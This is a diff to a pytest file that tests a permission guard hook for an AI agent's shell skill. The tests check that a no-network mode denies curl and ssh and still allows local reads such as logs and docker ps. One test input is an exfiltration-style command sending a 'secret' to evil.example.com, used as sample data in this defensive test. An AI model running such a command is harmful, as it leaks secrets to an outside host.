@@ -19,11 +19,15 @@ SKILL_DIR = Path(__file__).resolve().parents[1] / ".claude" / "skills" / "srv-ex
 GUARD = SKILL_DIR / "guard.py"
 
 
-def run_guard(command: str, tmp_path: Path) -> tuple[int, dict]:
+def run_guard(
+    command: str, tmp_path: Path, extra_env: dict | None = None
+) -> tuple[int, dict]:
     payload = json.dumps(
         {"tool_name": "Bash", "tool_input": {"command": command}, "session_id": "test"}
     )
     env = {"SRV_EXPLORE_AUDIT": str(tmp_path / "audit.log"), "PYTHONUTF8": "1"}
+    if extra_env:
+        env.update(extra_env)
     proc = subprocess.run(
         [sys.executable, str(GUARD)],
         input=payload,
@@ -193,3 +197,44 @@ def test_deny(command: str, tmp_path: Path) -> None:
     if decision:
         out = decision.get("hookSpecificOutput", {})
         assert out.get("permissionDecision") == "deny"
+
+
+# --- on-host сервис: egress закрыт (SRV_EXPLORE_NO_NETWORK) ---------------------
+
+NO_NET = {"SRV_EXPLORE_NO_NETWORK": "1"}
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        "curl -s https://api.example.com/health",
+        "curl https://evil.example.com/?leak=secret",
+        "ssh user@host docker ps",
+    ],
+)
+def test_no_network_blocks_curl_and_ssh(command: str, tmp_path: Path) -> None:
+    code, decision = run_guard(command, tmp_path, extra_env=NO_NET)
+    assert code == 2, f"с SRV_EXPLORE_NO_NETWORK должно быть deny: {command}"
+    if decision:
+        assert (
+            decision.get("hookSpecificOutput", {}).get("permissionDecision") == "deny"
+        )
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        "df -h",
+        "ls -la /var/log",
+        "cat /var/log/app.log",
+        "journalctl -u nginx --since today",
+        "docker ps -a",
+        'psql -c "SELECT 1"',
+    ],
+)
+def test_no_network_still_allows_local_reads(command: str, tmp_path: Path) -> None:
+    code, decision = run_guard(command, tmp_path, extra_env=NO_NET)
+    assert code == 0, (
+        f"локальное чтение должно оставаться allow даже с NO_NETWORK: {command}"
+    )
+    assert decision.get("hookSpecificOutput", {}).get("permissionDecision") == "allow"
